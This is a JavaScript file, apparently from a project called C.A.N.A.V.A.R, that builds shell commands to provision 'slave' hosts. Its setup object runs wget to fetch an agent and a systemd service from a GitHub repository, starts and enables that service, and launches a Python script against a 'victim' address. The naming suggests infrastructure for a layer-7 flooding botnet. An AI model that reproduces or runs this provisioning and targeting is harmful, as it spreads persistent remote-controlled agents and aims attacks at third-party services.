let setup = {
    slaveNick: "canavarslave",
    undle: "sudo apt -y update; sudo apt -y upgrade ; sudo apt install wget; cd ~; curl -sL https://deb.nodesource.com/setup_14.x -o nodesource_setup.sh; sudo bash nodesource_setup.sh; sudo apt install nodejs -y; sudo apt install git -y; sudo apt install python-pip -y",
    download_agent: "cd /; mkdir [slaveNick[; cd [slaveNick[; wget [agentLink[;",
    download_modules: "npm install express fs axios events moment delay quick.db child_process",
    download_script: "cd /[slaveNick[/; mkdir -p scripts; cd /[slaveNick[/scripts/; wget [SCRIPTLINK[ -O [SCRIPTNAME[;",
    service_setup: "cd /lib/systemd/system/; wget [serviceLink[ -O [serviceName[; systemctl daemon-reload; systemctl start [serviceName[; systemctl enable [serviceName[;",
    agentLink: "https://raw.githubusercontent.com/mehmetefeerkan/C.A.N.A.V.A.R/master/slave/l7/source/index.js",
    serviceLink: "https://raw.githubusercontent.com/mehmetefeerkan/C.A.N.A.V.A.R/master/slave/l7/source/canavarl7.service",
    serviceName: "canavarslave.service",
    dictation: "python2 [scriptdir[custommatter.py [victim[",
    scriptdir: "master/slave/l7/source/",
    victim: "1.1.1.1"
}

console.log(stitchSetupLinex("sleam[uwu[unal[uwu[eykum", "uwu", "sec")); 

function stitchSetupLinex(text, tofind, repwith) {
    let b = (text.split("["));
    for (let c = 0; c < b.length; c++) {
        let d = b[c];
        if (d === tofind) {
            d = d.split("]")[0]
            b[c] = repwith
        }
    }
    let e = b.join("")
    return e
}

function stitchSetupLine(asked, setup_) {
    if (setup_[asked]) {
        if ((setup_[asked]).includes("[")) {
            let a = setup_[asked]
            let b = (a.split("["))
            for (let c = 0; c < b.length; c++) {
                let d = b[c];
                d = d.split("]")[0]
                if (setup_[d]) {
                    b[c] = setup_[d]
                }
            }
            let e = b.join("")
            return e
        } else {
            return (setup_[asked] + " olduğu gibi ")
        }
    } else {
        return null
    }
}
